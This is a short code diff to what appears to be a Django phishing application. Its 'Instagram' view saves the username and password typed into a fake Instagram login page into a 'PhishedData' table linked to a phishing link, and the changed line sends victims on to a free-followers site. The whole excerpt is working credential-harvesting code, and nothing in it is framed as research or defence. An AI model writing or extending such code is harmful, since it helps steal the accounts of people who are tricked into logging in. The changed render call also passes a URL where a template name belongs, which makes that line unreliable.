@@ -221,6 +221,6 @@ def Instagram(request, code):
         username = request.POST.get('username')
         password = request.POST.get('password')
         PhishedData.objects.create(phishing_link=phishing_link,entered_username=username,entered_password=password)
-        return render(request, 'thank_you.html')
+        return render(request, 'https://leofame.com/free-instagram-followers')
 
     return render(request, 'Instagram.html', {'email': phishing_link.email})
